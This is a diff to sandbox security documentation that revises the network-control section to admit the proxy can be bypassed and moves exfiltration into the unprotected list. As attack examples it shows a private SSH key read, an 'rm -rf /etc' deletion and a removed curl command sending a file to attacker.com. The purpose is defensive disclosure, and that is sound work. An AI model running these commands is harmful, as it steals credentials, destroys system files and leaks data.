@@ -4,7 +4,9 @@
 
 ### Filesystem Isolation
 
-The sandbox uses Linux namespaces via bubblewrap to create an isolated filesystem view:
+Linux uses bubblewrap filesystem namespaces. macOS uses a default-deny Seatbelt profile with Apple runtime rules and configured filesystem access. Commands fail when the OS sandbox is unavailable, including in CI.
+
+Filesystem controls include:
 
 - **Read-only system directories**: `/usr`, `/lib`, `/bin` mounted as read-only
 - **Working directory only**: Write access restricted to project directory
@@ -19,12 +21,7 @@ The sandbox uses Linux namespaces via bubblewrap to create an isolated filesyste
 
 ### Network Control
 
-All network traffic is routed through a filtering proxy:
-
-- **Domain allowlisting**: Only approved domains accessible by default
-- **User approval**: New domains require explicit user consent
-- **Blocklisting**: Suspicious domains can be permanently blocked
-- **Traffic logging**: All network requests logged for audit
+The optional proxy filters requests from clients that use its proxy settings. It does not enforce network isolation: Linux shares the host network namespace, and the macOS profile allows network access. A command can bypass the proxy by opening a direct connection. Use an external firewall or an isolated virtual machine when network containment is required.
 
 ### Permission System
 
@@ -51,20 +48,11 @@ cat ~/.ssh/id_rsa
 rm -rf /etc
 ```
 
-✓ **Data Exfiltration**
-```bash
-# This requires approval
-curl https://attacker.com/exfiltrate -d @sensitive.txt
-```
-
-✓ **Malicious Dependencies**
-```bash
-# npm install malicious-package
-# - File writes restricted to working directory
-# - Network access to approved registries only
-```
-
 ### NOT Protected Against
+
+✗ **Direct network access and exfiltration**
+- Proxy settings are advisory and can be bypassed by commands.
+- Files readable inside the sandbox can be sent over the network.
 
 ✗ **Resource Exhaustion**
 - CPU intensive tasks
